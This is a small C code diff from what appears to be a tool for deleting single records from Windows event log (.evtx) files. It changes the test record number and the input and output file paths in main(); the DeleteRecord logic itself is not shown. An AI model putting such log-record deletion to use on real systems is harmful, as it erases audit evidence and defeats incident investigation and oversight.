@@ -431,9 +431,9 @@ ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
 int main()
 {
 	ULONG result = FAILURE;
-	ULONG64 RecordNumber = 1914;
+	ULONG64 RecordNumber = 14;
 	FILE* fp;
-	int err = fopen_s(&fp, "c:\\test\\System.evtx", "a+");
+	int err = fopen_s(&fp, "c:\\test\\Setup.evtx", "a+");
 	if (err != 0)
 	{
 		printf("openfile error!");
@@ -448,7 +448,7 @@ int main()
 	fclose(fp);
 
 	FILE* fp2;
-	err = fopen_s(&fp2, "c:\\test\\System2.evtx", "wb+");
+	err = fopen_s(&fp2, "c:\\test\\SetupNew.evtx", "wb+");
 	if (err != 0)
 	{
 		printf("createfile error!");
